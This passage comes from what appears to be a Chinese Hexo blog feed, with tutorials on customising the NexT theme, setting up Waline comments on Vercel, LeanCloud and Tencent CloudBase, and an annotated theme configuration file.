= (now - grt ) / <span class="number">1000</span> - (<span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * dnum) - (<span class="number">60</span> * <span class="number">60</span> * hnum) - (<span class="number">60</span> * mnum);</span></span><br><span class="line"><span class="language-javascript">        snum = <span class="title class_">Math</span>.<span class="title function_">round</span>(seconds); <span class="keyword">if</span>(<span class="title class_">String</span>(snum).<span class="property">length</span> ==<span class="number">1</span> )&#123;snum = <span class="string">&quot;0&quot;</span> + snum;&#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;timeDate&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;本站已安全运行 &quot;</span>+dnum+<span class="string">&quot; 天 &quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;times&quot;</span>).<span class="property">innerHTML</span> = hnum + <span class="string">&quot; 小时 &quot;</span> + mnum + <span class="string">&quot; 分 &quot;</span> + snum + <span class="string">&quot; 秒&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"><span class="built_in">setInterval</span>(<span class="string">&quot;createtime()&quot;</span>,<span class="number">250</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="4、本地搜索功能"><a href="#4、本地搜索功能" class="headerlink" title="4、本地搜索功能"></a>4、本地搜索功能</h5><p>安装插件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cnpm install hexo-generator-searchdb</span><br></pre></td></tr></table></figure>

<p>然后在主题配置文件中搜索<code>local_search</code>配置，将enable改为true，重新运行后会在侧边栏增加搜索选项。这里我还另外对搜索框的样式做了改变。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">//搜索框（local-search）的透明度设置</span><br><span class="line"><span class="selector-class">.popup</span>&#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.85</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="5、增加加载效果"><a href="#5、增加加载效果" class="headerlink" title="5、增加加载效果"></a>5、增加加载效果</h5><p>在主题配置文件找到<code>vendors</code>选项，添加pace的cdn地址。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pace: https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js</span><br><span class="line">pace_css: </span><br><span class="line">  blue:            </span><br><span class="line">    https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-barber-shop.min.css</span><br><span class="line">    https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-big-counter.min.css</span><br><span class="line">    https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-bounce.min.css,</span><br><span class="line">    https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-center-atom.min.css,</span><br><span class="line">    https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-center-circle.min.css,</span><br><span class="line">    https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-center-radar.min.css,</span><br><span class="line">    https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-center-simple.min.css,</span><br><span class="line">    https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-corner-indicator.min.css,</span><br><span class="line">    https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-fill-left.min.css,</span><br><span class="line">    https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-flash.min.css</span><br></pre></td></tr></table></figure>

<p>然后在pace选项开启加载效果并设置加载类型，这里需要注意，CSS文件需要对应加载效果的颜色和类型，具体可以去<a href="https://www.jsdelivr.com/package/npm/pace-js?path=themes">jsdelivr</a>看看，这个网站需要上外网才能看到，我喜欢蓝色，所以我把蓝色相关的CSS的链接都给拷贝到配置项里去，当然，大家选择喜欢的颜色喜欢的效果然后复制链接即可。</p>
<h5 id="6、添加网页标题崩溃欺骗搞怪特效"><a href="#6、添加网页标题崩溃欺骗搞怪特效" class="headerlink" title="6、添加网页标题崩溃欺骗搞怪特效"></a>6、添加网页标题崩溃欺骗搞怪特效</h5><p>在next\source\js文件夹中创建crash_cheat.js，代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">OriginTitle</span> = <span class="variable language_">document</span>.<span class="property">title</span>;</span><br><span class="line"><span class="keyword">var</span> titleTime;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;visibilitychange&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">hidden</span>) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">title</span> = <span class="string">&#x27;(ˉ(∞)ˉ)主人,快回来呀~~&#x27;</span>;</span><br><span class="line">        <span class="built_in">clearTimeout</span>(titleTime);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">title</span> = <span class="string">&#x27;(๑&gt;؂&lt;๑)欢迎回来！&#x27;</span> + <span class="title class_">OriginTitle</span>;</span><br><span class="line">        titleTime = <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">document</span>.<span class="property">title</span> = <span class="title class_">OriginTitle</span>;</span><br><span class="line">        &#125;, <span class="number">2000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>然后在layout目录的_layout.njk文件末尾添加以下内容</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--崩溃欺骗--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/js/crash_cheat.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="7、增加评论功能"><a href="#7、增加评论功能" class="headerlink" title="7、增加评论功能"></a>7、增加评论功能</h5><p>以前next老版本我是直接用的valine，然后用leancloud作为评论系统，但是我现在用的next8.12.1版本发现已经新版本已经弃用valine了。试用了畅言以及livere，发现这两个都需要登录才能发表评论，不太喜欢，因此上必应找了找，发现了一个新的<a href="https://waline.js.org/">Waline</a>评论系统，支持leadcloud，因此我这里主要讲这个新的系统怎么搭建。</p>
<h6 id="7-1、LeadCloud搭建"><a href="#7-1、LeadCloud搭建" class="headerlink" title="7.1、LeadCloud搭建"></a>7.1、LeadCloud搭建</h6><p><a href="https://console.leancloud.app/">LeadCloud</a>搭建方法很简单，注册然后创建应用即可，但是大家要注意，注册的时候需要注册国际版，注册国内版的话需要绑定域名，绑定域名就需要域名有备案才行。所以这里注册国际版比较方便。创建好应用之后在设置里头有个应用凭证，把<code>AppId</code>，<code>AppKey</code>，<code>MasterKey</code>三个复制下来，后面需要用到。</p>
<h6 id="7-2、Vercel-部署"><a href="#7-2、Vercel-部署" class="headerlink" title="7.2、Vercel 部署"></a>7.2、Vercel 部署</h6><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><a href="#-1">Vercel登录</a></li><li class="tab"><a href="#-2">创建Vercel 项目</a></li><li class="tab"><a href="#-3">配置环境变量</a></li><li class="tab"><a href="#-4">重新部署</a></li><li class="tab"><a href="#-5">绑定域名（可选）</a></li></ul><div class="tab-content"><div class="tab-pane active" id="-1"><p><a href="https://vercel.com/new/clone?repository-url=https://github.com/walinejs/waline/tree/main/example">Vercel</a>登录支持github直接登录，在创建账号页面直接选择github快速登录即可！</p></div><div class="tab-pane" id="-2"><p><img src="https://picgo-1256593051.cos.ap-guangzhou.myqcloud.com/Typora/image-20220620105650590.png"></p></div><div class="tab-pane" id="-3"><p>上一步项目创建后会基于waline进行初始化仓库，这个过程大概需要一两分钟，创建完后点击<code>Go to Dashboard</code>就可以跳转到应用控制台。</p>
<p><img src="https://picgo-1256593051.cos.ap-guangzhou.myqcloud.com/Typora/image-20220620110035333.png"></p>
<p>点击顶部的<code>Settings</code>的<code>Environment Variables</code>进入环境变量配置页，并配置三个环境变量 <code>LEAN_ID</code>, <code>LEAN_KEY</code> 和 <code>LEAN_MASTER_KEY</code> 。它们的值分别对应上一步在 LeanCloud 中获得的 <code>APP ID</code>, <code>APP KEY</code>, <code>Master Key</code>。如果你使用 LeanCloud 国内版，请额外配置 <code>LEAN_SERVER</code> 环境变量，值为你绑定好的域名。</p>
<p><img src="https://picgo-1256593051.cos.ap-guangzhou.myqcloud.com/Typora/image-20220620110430291.png"></p></div><div class="tab-pane" id="-4"><p>环境变量配置好之后，点击顶部的 <code>Deployments</code> 点击顶部最新的一次部署右侧的 <code>Redeploy</code> 按钮进行重新部署。该步骤是为了让刚才设置的环境变量生效。</p>
<p><img src="https://picgo-1256593051.cos.ap-guangzhou.myqcloud.com/Typora/image-20220620110615743.png"></p>
<p>等部署状态变为<code>Ready</code>。此时请点击 <code>Visit</code> ，即可跳转到部署好的网站地址，此地址即为你的服务端地址。</p></div><div class="tab-pane" id="-5"><p>没有域名的可以跳过，有域名的建议绑定自定义域名，这样你访问也比较方便，但是我个人建议是买一个域名，毕竟一个域名一年也才几十块钱，有了域名你也可以自定义自己的博客，域名可以在腾讯云等平台上购买。</p>
<p>绑定域名点击顶部的 <code>Settings</code> - <code>Domains</code> 进入域名配置页，输入需要绑定的域名并点击 <code>Add</code></p>
<p><img src="https://picgo-1256593051.cos.ap-guangzhou.myqcloud.com/Typora/image-20220620111517476.png"></p>
<p>之后添加新的 <code>CNAME</code> 解析记录，指向cname.vercel-dns.com，然后等待生效即可！</p>
<ul>
<li>评论系统：example.yourdomain.com</li>
<li>评论管理：example.yourdomain.com&#x2F;ui</li>
</ul>
<p>管理后台需要创建个账号，不要开启两步验证，两步验证太麻烦了。</p></div></div></div>



<h6 id="7-3、安装插件并启用"><a href="#7-3、安装插件并启用" class="headerlink" title="7.3、安装插件并启用"></a>7.3、安装插件并启用</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cnpm install @waline/hexo-next</span><br></pre></td></tr></table></figure>

<p>在主题配置文件末尾添加以下内容，或者在评论系统那里添加也行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Waline</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">For more information: https://waline.js.org, https://github.com/walinejs/waline</span></span><br><span class="line">waline:</span><br><span class="line">  enable: true</span><br><span class="line">  serverURL: example.yourdomain.com  # vercel 域名</span><br><span class="line">  placeholder: 欢迎评论！ # #评论框的默认文字</span><br><span class="line">  avatar: mm # 头像风格</span><br><span class="line">  meta: [nick, mail, link] # 自定义评论框上面的三个输入框的内容</span><br><span class="line">  pageSize: 10 # 评论数量多少时显示分页</span><br><span class="line">  lang: zh-cn # 语言, 可选值: en, zh-cn</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">Warning: 不要同时启用 `waline.visitor` 以及 `leancloud_visitors`.</span></span><br><span class="line">  visitor: false # 文章阅读统计</span><br><span class="line">  comment_count: true # 如果为 false , 评论数量只会在当前评论页面显示, 主页则不显示</span><br><span class="line">  requiredFields: [] # 设置用户评论时必填的信息，[nick,mail]: [nick] | [nick, mail]</span><br><span class="line">  libUrl: # Set custom library cdn url</span><br></pre></td></tr></table></figure>

<p>除了上面的这种免费部署之外，我们还可以把服务端部署在云服务器上、云函数上等等，具体的参考<a href="https://waline.js.org/">Waline</a>官网。我的是部署在腾讯云CloudBase上的，部署方法很简单，官网上有介绍，而且有免费资源可以用，阿里云也可以，阿里云每个月也有免费资源，然后数据库我也没有部署在LeadCloud上，而是部署在腾讯云开发的数据库上，也有免费额度，我觉得够用了，说实话，部署在服务器上或者云函数上比较好，因为免费的访问很慢，经常加载不出来评论区。</p>
<h5 id="8、图片单击放大"><a href="#8、图片单击放大" class="headerlink" title="8、图片单击放大"></a>8、图片单击放大</h5><p>图片缩放不用安装插件，next主题已经内置了，我们只需要在配置文件中开启即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">FancyBox is a tool that offers a <span class="built_in">nice</span> and elegant way to add zooming functionality <span class="keyword">for</span> images.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">For more information: https://fancyapps.com/fancybox/</span></span><br><span class="line">fancybox: true</span><br></pre></td></tr></table></figure>

<p>主题优化就到这里，主题配置文件里头还有很多杂七杂八的配置，建议有空的时候多了解了解，尽可能的把自己的网站给优化好。</p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>next</tag>
      </tags>
  </entry>
  <entry>
    <title>腾讯云cloudbase搭建waline评论系统</title>
    <url>/post/ffe060e9.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：腾讯云cloudbase搭建waline评论系统</p>
</blockquote>
<hr>
<span id="more"></span>

<p>前一篇博客讲waline搭建的时候，使用的是Vercel部署服务端，数据库用的LeadCloud，搭建完会发现，评论区刷新的速度会很慢，发评论基本也要等个两三秒，访问waline后台也会发现获取数据慢的情况，这是因为服务端和数据库都是在国外的原因，因此这篇博客主要是优化waline的访问速度，我采用服务端和数据库均部署在腾讯云的部署方法来加快速度，部署完后会很明显感觉访问速度增快！</p>
<h5 id="1、开通腾讯云cloudbase并创建环境"><a href="#1、开通腾讯云cloudbase并创建环境" class="headerlink" title="1、开通腾讯云cloudbase并创建环境"></a>1、开通腾讯云cloudbase并创建环境</h5><p><img src="https://picgo-1256593051.cos.ap-guangzhou.myqcloud.com/Typora/image-20220622101328821.png"></p>
<p>模板仓库选择空模板即可<br><img src="https://picgo-1256593051.cos.ap-guangzhou.myqcloud.com/Typora/image-20220622101547589.png"></p>
<p>地域可以选择广州或者上海，计费方式选按需付费就好了，因为我们主要用的是免费资源，没必要选择包年包月，然后写一个环境名称，下一步直接开通即可。</p>
<p><img src="https://picgo-1256593051.cos.ap-guangzhou.myqcloud.com/Typora/image-20220622101823271.png"></p>
<p>这是我账号云开发的免费资源，用来做评论系统完全够用了</p>
<p><img src="https://picgo-1256593051.cos.ap-guangzhou.myqcloud.com/Typora/image-20220622101933743.png"></p>
<h5 id="2、一键部署"><a href="#2、一键部署" class="headerlink" title="2、一键部署"></a>2、一键部署</h5><p>waline上支持一键部署到cloudbase，点击<a href="https://waline.js.org/guide/server/cloudbase.html">链接</a>进入云开发部署页面，点击部署到云开发就可以直接跳转到云开发页面上，然后选择地域以及我们刚刚创建的环境，等几分钟就部署好了。</p>
<p><img src="https://picgo-1256593051.cos.ap-guangzhou.myqcloud.com/Typora/image-20220622102339987.png"></p>
<h5 id="3、编辑环境变量"><a href="#3、编辑环境变量" class="headerlink" title="3、编辑环境变量"></a>3、编辑环境变量</h5><p>服务端部署到cloudbase可以默认直接使用云开发的数据库，不用写入环境变量，服务端没有部署在云开发上，也可以使用云开发数据库，如果服务端部署在其他地方，则需要配置环境变量，所以我们这里统一还是写一下环境变量。环境变量需要三个，分别是<code>TCB_ENV</code>，<code>TCB_ID</code>，<code>TCB_KEY</code>，对应腾讯云开发环境ID、腾讯云API密钥ID和腾讯云 API 密钥 Key，环境ID在腾讯云开发控制台环境总览里面可以看到，腾讯云API则要到腾讯云<a href="https://console.cloud.tencent.com/cam/capi">访问管理</a>看</p>
<p><img src="https://picgo-1256593051.cos.ap-guangzhou.myqcloud.com/Typora/image-20220622103104828.png"></p>
<p><img src="https://picgo-1256593051.cos.ap-guangzhou.myqcloud.com/Typora/image-20220622103141701.png"></p>
<p>接下来在我的应用里面点击管理，编辑然后填入环境变量重新部署即可。</p>
<p><img src="https://picgo-1256593051.cos.ap-guangzhou.myqcloud.com/Typora/image-20220622103407969.png"></p>
<p>访问地址在这里可以看到，后台管理就在访问地址后加入&#x2F;ui即可，记得要先进后台管理创建账号。</p>
<p>点击环境的访问服务可以自定义域名以及改变触发路径，建议触发路径改成&#x2F;，即直接访问域名就可以访问到评论地址，而不用加后缀啥的，自定义域名需要域名有备案，剩下其他操作可以参考上一篇博客。</p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>next</tag>
      </tags>
  </entry>
  <entry>
    <title>next主题配置文件配置项介绍</title>
    <url>/post/1fccee94.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：next主题配置文件配置项介绍</p>
</blockquote>
<hr>
<span id="more"></span>

<p>上篇博客我们介绍了站点配置文件中的大部分配置项的作用，本篇博客则是介绍next主题的主题配置文件中配置项的作用。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Allow to cache content generation.</span></span><br><span class="line"><span class="attr">cache:</span>                       <span class="comment"># 是否允许缓存内容生成，默认即可</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Remove unnecessary files after hexo generate.</span></span><br><span class="line"><span class="attr">minify:</span> <span class="literal">false</span>               <span class="comment"># 是否允许生成最小化hexo网站，默认即可</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define custom file paths.</span></span><br><span class="line"><span class="comment"># Create your custom files in site directory `source/_data` and uncomment needed files below.</span></span><br><span class="line"><span class="attr">custom_file_path:</span>          <span class="comment"># 创建自定义文件的路径</span></span><br><span class="line">  <span class="comment">#head: source/_data/head.njk</span></span><br><span class="line">  <span class="comment">#header: source/_data/header.njk</span></span><br><span class="line">  <span class="comment">#sidebar: source/_data/sidebar.njk</span></span><br><span class="line">  <span class="comment">#postMeta: source/_data/post-meta.njk</span></span><br><span class="line">  <span class="comment">#postBodyEnd: source/_data/post-body-end.njk</span></span><br><span class="line">  <span class="comment">#footer: source/_data/footer.njk</span></span><br><span class="line">  <span class="comment">#bodyEnd: source/_data/body-end.njk</span></span><br><span class="line">  <span class="comment">#variable: source/_data/variables.styl</span></span><br><span class="line">  <span class="comment">#mixin: source/_data/mixins.styl</span></span><br><span class="line">  <span class="comment">#style: source/_data/styles.styl</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Scheme Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Schemes    # 视图选择，这个看个人喜好，我个人是偏向Gemini</span></span><br><span class="line"><span class="attr">scheme:</span> <span class="string">Muse</span>             <span class="comment"># Muse默认方案，使用黑白色调</span></span><br><span class="line"><span class="comment">#scheme: Mist             # Mist具有整洁的单列视图</span></span><br><span class="line"><span class="comment">#scheme: Pisces          # Pisces 双栏方案</span></span><br><span class="line"><span class="comment">#scheme: Gemini             # Gemini看起来像双鱼座，但有明显的带有阴影的柱状块，看起来对视图更敏感</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Dark Mode</span></span><br><span class="line"><span class="attr">darkmode:</span> <span class="literal">false</span>         <span class="comment"># 是否开启黑暗模式</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Site Information Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 网站图标设置，可以自定义图标，然后把图片资源放在source/images目录中即可，为了增快访问速度，可以把资源放在其他地方</span></span><br><span class="line"><span class="attr">favicon:</span></span><br><span class="line">  <span class="attr">small:</span> <span class="string">/images/favicon-16x16-next.png</span></span><br><span class="line">  <span class="attr">medium:</span> <span class="string">/images/favicon-32x32-next.png</span></span><br><span class="line">  <span class="attr">apple_touch_icon:</span> <span class="string">/images/apple-touch-icon-next.png</span></span><br><span class="line">  <span class="attr">safari_pinned_tab:</span> <span class="string">/images/logo.svg</span></span><br><span class="line">  <span class="comment">#android_manifest: /manifest.json</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义徽标，看个人选择</span></span><br><span class="line"><span class="comment"># Custom Logo (Warning: Do not support scheme Mist)</span></span><br><span class="line"><span class="attr">custom_logo:</span> <span class="comment">#/uploads/custom-logo.jpg</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建共用，实际上就是展示版权信息，看个人选择</span></span><br><span class="line"><span class="comment"># Creative Commons 4.0 International License.</span></span><br><span class="line"><span class="comment"># See: https://creativecommons.org/about/cclicenses/</span></span><br><span class="line"><span class="attr">creative_commons:</span></span><br><span class="line">  <span class="comment"># Available values: by | by-nc | by-nc-nd | by-nc-sa | by-nd | by-sa | cc-zero</span></span><br><span class="line">  <span class="attr">license:</span> <span class="string">by-nc-sa</span></span><br><span class="line">  <span class="comment"># Available values: big | small</span></span><br><span class="line">  <span class="attr">size:</span> <span class="string">small</span></span><br><span class="line">  <span class="attr">sidebar:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">post:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># You can set a language value if you prefer a translated version of CC license, e.g. deed.zh</span></span><br><span class="line">  <span class="comment"># CC licenses are available in 39 languages, you can find the specific and correct abbreviation you need on https://creativecommons.org</span></span><br><span class="line">  <span class="attr">language:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Open graph settings</span></span><br><span class="line"><span class="comment"># See: https://hexo.io/docs/helpers#open-graph</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 没仔细去研究，反正默认即可</span></span><br><span class="line"><span class="attr">open_graph:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">options:</span></span><br><span class="line">    <span class="comment">#twitter_card: &lt;twitter:card&gt;</span></span><br><span class="line">    <span class="comment">#twitter_id: &lt;twitter:creator&gt;</span></span><br><span class="line">    <span class="comment">#twitter_site: &lt;twitter:site&gt;</span></span><br><span class="line">    <span class="comment">#twitter_image: &lt;twitter:image&gt;</span></span><br><span class="line">    <span class="comment">#google_plus: &lt;g+:profile_link&gt;</span></span><br><span class="line">    <span class="comment">#fb_admins: &lt;fb:admin_id&gt;</span></span><br><span class="line">    <span class="comment">#fb_app_id: &lt;fb:app_id&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Menu Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Usage: `Key: /link/ || icon`</span></span><br><span class="line"><span class="comment"># Key is the name of menu item. If the translation for this item is available, the translated text will be loaded, otherwise the Key name will be used. Key is case-sensitive.</span></span><br><span class="line"><span class="comment"># Value before `||` delimiter is the target link, value after `||` delimiter is the name of Font Awesome icon.</span></span><br><span class="line"><span class="comment"># External url should start with http:// or https://</span></span><br><span class="line"><span class="comment"># 菜单配置项，一般用到首页、标签、分类等菜单，启用某菜单项的话需要配置相关的页面，配置相关页面在source目录下创建</span></span><br><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="comment">#home: / || fa fa-home</span></span><br><span class="line">  <span class="comment">#about: /about/ || fa fa-user</span></span><br><span class="line">  <span class="comment">#tags: /tags/ || fa fa-tags</span></span><br><span class="line">  <span class="comment">#categories: /categories/ || fa fa-th</span></span><br><span class="line">  <span class="comment">#archives: /archives/ || fa fa-archive</span></span><br><span class="line">  <span class="comment">#schedule: /schedule/ || fa fa-calendar</span></span><br><span class="line">  <span class="comment">#sitemap: /sitemap.xml || fa fa-sitemap</span></span><br><span class="line">  <span class="comment">#commonweal: /404/ || fa fa-heartbeat</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable / Disable menu icons / item badges.</span></span><br><span class="line"><span class="comment"># 是否启用菜单图标以及菜单项统计，建议都开</span></span><br><span class="line"><span class="attr">menu_settings:</span></span><br><span class="line">  <span class="attr">icons:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">badges:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Sidebar Settings</span></span><br><span class="line"><span class="comment"># See: https://theme-next.js.org/docs/theme-settings/sidebar</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># 侧边栏设置，设置侧边栏位置，看个人喜欢</span></span><br><span class="line"><span class="attr">sidebar:</span></span><br><span class="line">  <span class="comment"># Sidebar Position.</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">left</span></span><br><span class="line">  <span class="comment">#position: right</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 侧边栏宽度设置，没有特殊要求默认即可</span></span><br><span class="line">  <span class="comment"># Manual define the sidebar width. If commented, will be default for:</span></span><br><span class="line">  <span class="comment"># Muse | Mist: 320</span></span><br><span class="line">  <span class="comment"># Pisces | Gemini: 240</span></span><br><span class="line">  <span class="comment">#width: 300</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置侧栏显示的时机，仅适用于Muse | Mist，由于我设置的是Gemini，所以这块没怎么研究，感兴趣的话可以自行研究</span></span><br><span class="line">  <span class="comment"># Sidebar Display (only for Muse | Mist), available values:</span></span><br><span class="line">  <span class="comment">#  - post    expand on posts automatically. Default.</span></span><br><span class="line">  <span class="comment">#  - always  expand for all pages automatically.</span></span><br><span class="line">  <span class="comment">#  - hide    expand only when click on the sidebar toggle icon.</span></span><br><span class="line">  <span class="comment">#  - remove  totally remove sidebar including sidebar toggle.</span></span><br><span class="line">  <span class="attr">display:</span> <span class="string">post</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置侧边栏填充</span></span><br><span class="line">  <span class="comment"># Sidebar padding in pixels.</span></span><br><span class="line">  <span class="attr">padding:</span> <span class="number">18</span></span><br><span class="line"><span class="comment"># 侧边栏与顶部菜单栏的位置</span></span><br><span class="line">  <span class="comment"># Sidebar offset from top menubar in pixels (only for Pisces | Gemini).</span></span><br><span class="line">  <span class="attr">offset:</span> <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Sidebar Avatar</span></span><br><span class="line"><span class="comment"># 是否设置侧边栏图像，看个人爱好</span></span><br><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="comment"># Replace the default image and set the url here.</span></span><br><span class="line">  <span class="attr">url:</span> <span class="comment">#/images/avatar.gif</span></span><br><span class="line">  <span class="comment"># If true, the avatar will be displayed in circle.</span></span><br><span class="line">  <span class="comment"># 是否显示为圆形图像</span></span><br><span class="line">  <span class="attr">rounded:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># If true, the avatar will be rotated with the cursor.</span></span><br><span class="line">  <span class="comment"># 是否设置鼠标悬停时旋转头像</span></span><br><span class="line">  <span class="attr">rotated:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 是否在侧边栏显示分类、标签等</span></span><br><span class="line"><span class="comment"># Posts / Categories / Tags in sidebar.</span></span><br><span class="line"><span class="attr">site_state:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 社交链接添加</span></span><br><span class="line"><span class="comment"># Social Links</span></span><br><span class="line"><span class="comment"># Usage: `Key: permalink || icon`</span></span><br><span class="line"><span class="comment"># Key is the link label showing to end users.</span></span><br><span class="line"><span class="comment"># Value before `||` delimiter is the target permalink, value after `||` delimiter is the name of Font Awesome icon.</span></span><br><span class="line"><span class="attr">social:</span></span><br><span class="line">  <span class="comment">#GitHub: https://github.com/yourname || fab fa-github</span></span><br><span class="line">  <span class="comment">#E-Mail: mailto:yourname@gmail.com || fa fa-envelope</span></span><br><span class="line">  <span class="comment">#Weibo: https://weibo.com/yourname || fab fa-weibo</span></span><br><span class="line">  <span class="comment">#Google: https://plus.google.com/yourname || fab fa-google</span></span><br><span class="line">  <span class="comment">#Twitter: https://twitter.com/yourname || fab fa-twitter</span></span><br><span class="line">  <span class="comment">#FB Page: https://www.facebook.com/yourname || fab fa-facebook</span></span><br><span class="line">  <span class="comment">#StackOverflow: https://stackoverflow.com/yourname || fab fa-stack-overflow</span></span><br><span class="line">  <span class="comment">#YouTube: https://youtube.com/yourname || fab fa-youtube</span></span><br><span class="line">  <span class="comment">#Instagram: https://instagram.com/yourname || fab fa-instagram</span></span><br><span class="line">  <span class="comment">#Skype: skype:yourname?call|chat || fab fa-skype</span></span><br><span class="line"></span><br><span class="line"><span class="attr">social_icons:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">icons_only:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">transition:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 友情链接添加</span></span><br><span class="line"><span class="comment"># Blog rolls</span></span><br><span class="line"><span class="attr">links_settings:</span></span><br><span class="line">  <span class="attr">icon:</span> <span class="string">fa</span> <span class="string">fa-globe</span>   <span class="comment"># 图标可以选择其他图标，我个人使用的是fa fa-link</span></span><br><span class="line">  <span class="attr">title:</span> <span class="string">Links</span></span><br><span class="line">  <span class="comment"># Available values: block | inline</span></span><br><span class="line">  <span class="attr">layout:</span> <span class="string">block</span>   <span class="comment"># 友链布局</span></span><br><span class="line"><span 